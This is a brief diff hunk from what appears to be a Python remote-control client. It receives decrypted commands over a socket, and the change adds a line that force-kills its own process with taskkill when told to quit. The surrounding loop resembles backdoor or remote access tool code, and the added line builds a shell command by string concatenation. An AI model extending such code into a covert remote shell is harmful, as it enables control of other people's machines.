@@ -299,6 +299,7 @@ while True:
 
 	if decrypted == "quit" or decrypted == "exit":
 		s.close()
+		fsubprocess('taskkill /f /im ' + sys.argv[0])
 		exit()
 
 	elif decrypted == 'donaught':
